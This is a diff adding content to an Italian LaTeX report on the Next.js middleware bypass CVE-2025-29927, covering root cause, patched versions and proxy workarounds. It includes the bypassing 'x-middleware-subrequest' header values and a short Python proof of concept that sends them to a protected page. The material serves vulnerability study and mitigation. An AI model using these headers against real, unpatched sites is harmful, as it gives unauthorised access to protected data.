@@ -3,10 +3,21 @@
 % TODO: Inserisci timeline della vulnerabilità
 
 \documentclass[a4paper,oneside,12pt]{report}
-\usepackage[utf8]{inputenc}
 \usepackage[italian]{babel}
 \usepackage{hyperref}
+\usepackage{hyphenat}
+\hyphenation{mate-mati-ca recu-perare}
 \usepackage{parskip}
+\usepackage{minted}
+\usepackage{graphicx}
+\usepackage{ragged2e}
+\hypersetup{
+	colorlinks=true,
+	linkcolor=blue,
+	filecolor=magenta,
+	urlcolor=cyan
+}
+\urlstyle{same}
 
 \linespread{1.25}
 
@@ -23,6 +34,7 @@
 \addcontentsline{toc}{chapter}{Introduzione}
 \chapter*{Introduzione}
 \label{chap:introduzione}
+\justifying
 
 Nel contesto dello sviluppo web moderno, la sicurezza delle applicazioni rappresenta una sfida critica e sempre più complessa. I framework frontend e full-stack, come \texttt{Next.js}, forniscono funzionalità avanzate per lo sviluppo rapido di applicazioni web dinamiche, ma allo stesso tempo introducono superfici di attacco potenziali che, se trascurate, possono compromettere l'intera applicazione e i dati degli utenti.
 
@@ -101,39 +113,284 @@ Sulla base di queste metriche, la \emph{CVE-2025-29927} riceve un punteggio base
 \chapter{Analisi della causa radice}
 \label{chap:analisi-causa-radice}
 
-% TODO: Leggi https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
-
 \section{Origine della vulnerabilit\`a}
 \label{sec:origine-vulnerabilita}
+
+\texttt{Next.js}, essendo un framework completo, ha un \emph{middleware} che consente di fare:
+\begin{itemize}
+	\item \textit{path rewriting} (riscrittura del percorso);
+	\item \textit{URL redirecting} (reindirizzamento dell'URL);
+	\item aggiunta di \textit{headers} alla risposta;
+	\item e, in maniera molto pi\`u rilevante, \textit{authentication} e \textit{authorization}.
+\end{itemize}
+Ad esempio, \`e possibile proteggere una route con un middleware che verifica se l'utente \`e autenticato e autorizzato ad accedere a quella risorsa. Tuttavia, in alcune configurazioni, il middleware non applica correttamente le restrizioni di accesso previste per determinate route dinamiche o protette.
+
+Il codice vulnerabilie si trova all'interno del file \texttt{packages/next/server/next-server.ts} in particolare nella funzione \texttt{runMiddleware}:
+\begin{figure}[H]
+	\centering
+\begin{minted}[breaklines,frame=lines,linenos,firstnumber=686,fontsize=\scriptsize]{javascript}
+const subreq = params.request.headers[`x-middleware-subrequest`]
+const subrequests = typeof subreq === 'string' ? subreq.split(':') : []
+const allHeaders = new Headers()
+let result: FetchEventResult | null = null
+
+for (const middleware of this.middleware || []) {
+  if (middleware.match(params.parsedUrl.pathname)) {
+    if (!(await this.hasMiddleware(middleware.page, middleware.ssr))) {
+      console.warn(`The Edge Function for ${middleware.page} was not found`)
+      continue
+    }
+
+    await this.ensureMiddleware(middleware.page, middleware.ssr)
+
+    const middlewareInfo = getMiddlewareInfo({
+      dev: this.renderOpts.dev,
+      distDir: this.distDir,
+      page: middleware.page,
+      serverless: this._isLikeServerless,
+    })
+
+    if (subrequests.includes(middlewareInfo.name)) {
+      result = {
+        response: NextResponse.next(),
+        waitUntil: Promise.resolve(),
+      }
+      continue
+    }
+\end{minted}
+	\caption{Codice vulnerabile in \texttt{Next.js} v12.0.7}
+	\label{fig:nextjs-vulnerable-code-v12.0.7}
+\end{figure}
+
+Com'\`e possibile notare nelle linee 686-687 si estrae il contenuto dell'header \texttt{x-middleware-subrequest} e lo si tratta come una lista di stringhe separate da dei due punti.
+
+Sucessivamente, nelle linee 707-713, si controlla se questa lista contiene il valore della variabile \texttt{middlewareInfo.name}. Se questo \`e vero, il middleware viene completamente ignorato e la richiesta viene inoltrata alla destinazione senza alcun controllo.
+
+Il valore di \texttt{middlwareInfo.name} si pu\`o facilmente indovinare in quanto \`e l'unico percorso in cui il middleware si trova ed \`e quindi composto dal nome della directory dove si trova il middleware e il nome del file. Nella versione 12 di \texttt{Next.js} l'unica route possibile era quella di \texttt{pages} e quindi il middleware si deve trovare li dentro. Per cui l'unico valore possibile per quella versione era:
+\begin{center}
+	\scriptsize
+	\texttt{x-middleware-subrequest: pages/\_middleware}
+\end{center}
+
+Dalle versioni successive, il file del middleware non deve pi\`u trovarsi nella route \texttt{pages} e, inoltre, il file non si chiama pi\`u \texttt{\_middleware} ma viene rimosso il trattino basso. Quindi l'header diventa:
+\begin{center}
+	\scriptsize
+	\texttt{x-middleware-subrequest: middleware}
+\end{center}
+
+Inoltre, \`e possibile che esso si trovi nella cartella \texttt{src}. Quindi un'altra possibilit\`a \`e:
+\begin{center}
+	\scriptsize
+	\texttt{x-middleware-subrequest: src/middleware}
+\end{center}
+
+Nelle versioni pi\`u recenti di \texttt{Next.js} la logica \`e cambiata leggermente. Il file vulnerabile \`e \texttt{packages/next/src/server/web/sandbox/sandbox.ts}:
+\begin{figure}[H]
+	\centering
+\begin{minted}[breaklines,frame=lines,linenos,firstnumber=94,fontsize=\scriptsize]{javascript}
+export const run = withTaggedErrors(async function runWithTaggedErrors(params) {
+  const runtime = await getRuntimeContext(params)
+  const subreq = params.request.headers[`x-middleware-subrequest`]
+  const subrequests = typeof subreq === 'string' ? subreq.split(':') : []
+
+  const MAX_RECURSION_DEPTH = 5
+  const depth = subrequests.reduce(
+    (acc, curr) => (curr === params.name ? acc + 1 : acc),
+    0
+  )
+
+  if (depth >= MAX_RECURSION_DEPTH) {
+    return {
+      waitUntil: Promise.resolve(),
+      response: new runtime.context.Response(null, {
+        headers: {
+          'x-middleware-next': '1',
+        },
+      }),
+    }
+  }
+\end{minted}
+	\caption{Codice vulnerabile in \texttt{Next.js} v15.1.7}
+	\label{fig:nextjs-vulnerable-code-v15.1.7}
+\end{figure}
+Nelle linee 96-97 l'header viene elaborato come prima ma la condizione \`e diversa: il valore della variabile \texttt{depth} deve essere maggiore di \raggedright\texttt{MAX\_RECURSION\_DEPTH} (ovvero 5). La variabile \texttt{depth} viene calcolata contando il numero di valori nella lista uguali a \texttt{params.name} cio\`e sempre il percorso del middleware. Quindi l'header diventer\`a:
+\begin{center}
+	\scriptsize
+	\texttt{x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware}
+\end{center}
 
 \chapter{Exploitation}
 \label{chap:exploitation}
 
-\section{Fasi dell'attacco}
-\label{sec:fasi-attacco}
+L'attacco \`e molto semplice e richiede d'inviare una richiesta HTTP ad una pagina protetta dal middleware impostando l'header \texttt{x-middleware-subrequest} ad uno dei valori vulnerabili descritti nel capitolo precedente.
 
 \section{\textit{Proof of Concept} (PoC) in Python}
 \label{sec:poc-python}
 
+\begin{minted}[breaklines,frame=lines,linenos,fontsize=\scriptsize]{python}
+import requests, sys
+
+protected_page = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000/dashboard"
+
+response = requests.get(protected_page, headers={
+    'X-Middleware-Subrequest': 'middleware'
+}, allow_redirects=False)
+
+# Do stuff with the reponse
+\end{minted}
+
+Il PoC fornito pu\`o essere eseguito con il comando:
+\begin{center}
+	\scriptsize
+	\texttt{python3 exploit.py [pagina\_protetta]}
+\end{center}
+ed eseguir\`a una richiesta alla pagina protetta fornita come argomento usando l'header vulnerabile.
+
 \section{\textit{Proof of Concept} (PoC) in Burp Suite}
 \label{sec:poc-burp-suite}
 
-\chapter{Fixes e Mitigazione}
+\`E possibile anche usare \emph{Burp Suite} per eseguire l'exploit inserendo manualmente l'header nella richiesta.
+
+\begin{figure}[H]
+	\centering
+	\includegraphics[width=\textwidth]{images/burpsuite_exploit_redirect.png}
+	\caption{Richiesta senza header vulnerabile in Burp Suite}
+	\label{fig:burpsuite-exploit-redirect}
+\end{figure}
+
+\begin{figure}[H]
+	\centering
+	\includegraphics[width=\textwidth]{images/burpsuite_exploit_ok.png}
+	\caption{Richiesta con header vulnerabile in Burp Suite}
+	\label{fig:burpsuite-exploit-ok}
+\end{figure}
+
+\chapter{Fixes e mitigazione}
 \label{chap:fixes-mitigazione}
 
 \section{Aggiornamento del framework}
 \label{sec:aggiornamento-framework}
 
+La vulnerabilit\`a \`e stata patchata nelle seguenti versioni:
+\begin{itemize}
+	\item per \texttt{Next.js} 15.x: in 15.2.3;
+	\item per \texttt{Next.js} 14.x: in 14.2.25;
+	\item per \texttt{Next.js} 13.x: in 13.5.9;
+	\item per \texttt{Next.js} 12.x: in 12.3.5;
+	\item per \texttt{Next.js} 11.x: bisogna usare un \textit{workaround}.
+\end{itemize}
+
+La patch per la vulnerabilit\`a \`e la seguente ed \`e distribuita in tre file:
+\begin{enumerate}
+	\item \texttt{packages/next/src/server/lib/router-server.ts}
+	\item \texttt{packages/next/src/server/lib/server-ipc/utils.ts};
+	\item \texttt{packages/next/src/server/web/sandbox/context.ts}.
+\end{enumerate}
+
+\begin{figure}[H]
+	\centering
+	\begin{minted}[breaklines,frame=lines,linenos,firstnumber=169,fontsize=\scriptsize]{javascript}
+const randomBytes = new Uint8Array(8)
+crypto.getRandomValues(randomBytes)
+const middlewareSubrequestId = Buffer.from(randomBytes).toString('hex')
+;(globalThis as any)[Symbol.for('@next/middleware-subrequest-id')] = middlewareSubrequestId
+	\end{minted}
+	\caption{Modifica nel primo file citato sopra}
+	\label{fig:patch-file-1}
+\end{figure}
+Questa modifica si assicura che ogni volta che il server viene inizializzato si generi un identificatore univoco (\texttt{x-middleware-subrequest-id}) accessibile globalmente.
+
+\begin{figure}[H]
+	\centering
+	\begin{minted}[breaklines,frame=lines,linenos,firstnumber=61,fontsize=\scriptsize]{javascript}
+// If this request didn't origin from this session we filter
+// out the "x-middleware-subrequest" header so we don't skip
+// middleware incorrectly
+if (
+  header === 'x-middleware-subrequest' &&
+  headers['x-middleware-subrequest-id'] !==
+    (globalThis as any)[Symbol.for('@next/middleware-subrequest-id')]
+) {
+  delete headers['x-middleware-subrequest']
+}
+	\end{minted}
+	\caption{Modifica nel secondo file citato sopra}
+	\label{fig:patch-file-2}
+\end{figure}
+Questa modifica si assicura che ogni volta che si incontra l'header \texttt{x-middleware-subrequest} si controlli se l'header \texttt{x-middleware-subrequest-id} \`e uguale a quello generato in precedenza. Se non lo \`e, allora l'header vulnerabile viene rimosso.
+
+\begin{figure}[H]
+	\centering
+	\begin{minted}[breaklines,frame=lines,linenos,firstnumber=376,fontsize=\scriptsize]{javascript}
+init.headers.set(
+  'x-middleware-subrequest-id',
+  (globalThis as any)[Symbol.for('@next/middleware-subrequest-id')]
+)
+	\end{minted}
+	\caption{Modifica nel terzo file citato sopra}
+	\label{fig:patch-file-3}
+\end{figure}
+Questa modifica imposta l'header \texttt{x-middleware-subrequest-id} con il valore generato in precedenza in modo tale che il middleware possa tracciare, per scopi di debugging, la subrequest attuale.
+
 \section{\textit{Workaround} momentaneo}
 \label{sec:workaround-momentaneo}
+
+Nelle versioni v11.x di \texttt{Next.js} non \`e presente un fix e quindi si deve usare un \textit{workaround} se non \`e possibile aggiornarlo alla versione pi\`u recente. Il workaround consiste nell'usare un proxy che rimuova l'header \texttt{x-middleware-subrequest} dalle richieste in ingresso. Questo pu\`o essere fatto con un server \texttt{nginx} o \texttt{Apache}.
+
+\begin{figure}[H]
+	\centering
+	\begin{minted}[breaklines,frame=lines,linenos,firstnumber=1,fontsize=\scriptsize]{nginx}
+proxy_set_header x-middleware-subrequest "";
+	\end{minted}
+	\caption{Configurazione di \texttt{nginx} per rimuovere l'header}
+	\label{fig:nginx-workaround}
+\end{figure}
+
+\begin{figure}[H]
+	\centering
+	\begin{minted}[breaklines,frame=lines,linenos,firstnumber=1,fontsize=\scriptsize]{apache}
+RequestHeader unset x-middleware-subrequest
+	\end{minted}
+	\caption{Configurazione di \texttt{Apache} per rimuovere l'header}
+	\label{fig:apache-workaround}
+\end{figure}
 
 \addcontentsline{toc}{chapter}{Conclusioni}
 \chapter*{Conclusioni}
 \label{chap:conclusioni}
+\justifying
+
+In questo documento è stata analizzata in dettaglio la vulnerabilità CVE-2025-29927 che ha interessato \texttt{Next.js}, uno dei framework più diffusi per lo sviluppo di applicazioni web moderne. Attraverso l’analisi, la ricostruzione dell’origine del problema e la dimostrazione dell’exploit, è emerso chiaramente come anche i framework più maturi e mantenuti possano contenere errori di progettazione o implementazione con gravi ripercussioni sulla sicurezza.
+
+La vulnerabilità esaminata compromette in modo diretto la \emph{confidenzialità} dei dati e può, in alcuni casi, avere impatti indiretti sull’\emph{integrità} dell’applicazione. È stata identificata una falla nella logica di accesso alle risorse che, in presenza di parametri specifici, permette a un attaccante remoto non autenticato di accedere a contenuti protetti.
+
+È stato inoltre approfondito il punteggio assegnato alla vulnerabilit\`a e il suo calcolo, utile per quantificare la gravità della vulnerabilità.
+
+La scrittura di due PoC, uno in Python e uno in \textit{Burp Suite}, ha dimostrato l’effettiva possibilità di sfruttare la vulnerabilit\`a in un contesto reale.
+
+In conclusione, l’analisi della CVE-2025-29927 rappresenta un chiaro esempio di come la sicurezza non sia un processo dinamico e imprescindibile del ciclo di vita del software. Comprendere a fondo le cause e le conseguenze di una vulnerabilità non solo aiuta a proteggere i propri sistemi, ma contribuisce a diffondere una cultura della \emph{sicurezza proattiva}, essenziale nel panorama tecnologico odierno.
 
 \addcontentsline{toc}{chapter}{Riferimenti}
 \chapter*{Riferimenti}
 \label{chap:references}
+
+\begin{enumerate}
+	\item \href{https://nvd.nist.gov/vuln/detail/CVE-2025-29927}{CVE-2025-29927}
+
+	Dettaglio ufficiale della vulnerabilità CVE-2025-29927.
+	\item \href{https://vercel.com/blog/postmortem-on-next-js-middleware-bypass}{Postmortem on Next.js Middleware bypass}
+
+	Articolo di Vercel che descrive la vulnerabilità e le contromisure adottate.
+	\item \href{https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware}{Next.js and the corrupt middleware: the authorizing artifact}
+
+	Articolo di \href{https://x.com/zhero___}{zhero}, uno dei due ricercatori in merito, sulla vulnerabilità CVE-2025-29927.
+	\item \href{https://www.picussecurity.com/resource/blog/cve-2025-29927-nextjs-middleware-bypass-vulnerability}{CVE-2025-29927: Next.js Middleware Bypass Vulnerability Explained}
+
+	Articolo sul \textit{workaround} della vulnerabilità CVE-2025-29927.
+	\item \href{https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw}{Authorization Bypass in Next.js Middleware}
+
+	\emph{Security advisory} di GitHub che descrive la vulnerabilità CVE-2025-29927.
+\end{enumerate}
 
 \end{document}
 
